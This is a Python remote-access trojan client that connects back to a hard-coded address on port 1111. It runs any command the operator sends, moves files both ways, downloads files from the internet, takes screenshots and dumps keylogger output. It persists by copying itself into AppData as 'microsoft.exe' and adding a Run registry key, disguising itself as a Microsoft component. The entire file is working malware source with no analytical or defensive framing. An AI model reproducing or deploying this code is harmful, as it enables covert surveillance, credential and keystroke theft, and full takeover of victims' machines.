#!/usr/bin/python

import socket
import subprocess
import json
import time 
import os
import sys
import shutil
import base64
import requests
import ctypes
import threading
import keylogger
from mss import mss

def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue
def screenshot():
	with mss() as screenshot:
		screenshot.shot()
def connection():
        while True:
                time.sleep(20)
                try:
                        sock.connect(("192.168.43.128",1111))
			shell()
                except:
                        connection()
def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)
def shell():
        while True:
                command = reliable_recv()
                if command == "q":
			try:
				os.remove(path)
			except:
				continue
                        break
		elif command == "help":
			help_options = '''					  download = Download a file From target pc
					  upload = upload a file to target pc  
					  get =  Download file From internet
					  start = start a program In target pc
					  screenshot = take a screenshot of target pc'''
			reliable_send(help_options)
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
			with open(command[7:], "wb") as fin:
				result = reliable_recv()
				fin.write(base64.b64decode(result))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("succesfully downloaded")
			except:
				reliable_send("failed to download")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] Started")
			except:
				reliable_send("[!!] can't start")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png","rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
				reliable_send("[!!] can't take screenshot")
		elif command[:12] == "keylog_start":
			t1 = threading.Thread(target=keylogger.start)
			t1.start()
		elif command[:11] == "keylog_dump":
			fn = open(path, "r")
			reliable_send(fn.read())
                else:
                        try:
                                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                result = proc.stdout.read() + proc.stderr.read()
                                reliable_send(result)
                        except:
                                reliable_send("can't execute that command")


path = os.environ["appdata"] + "\\keylogger.txt"
location = os.environ["appdata"] + "\\microsoft.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v microsoft /t REZ_SZ /d "' + location + '"', shell=True)


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()

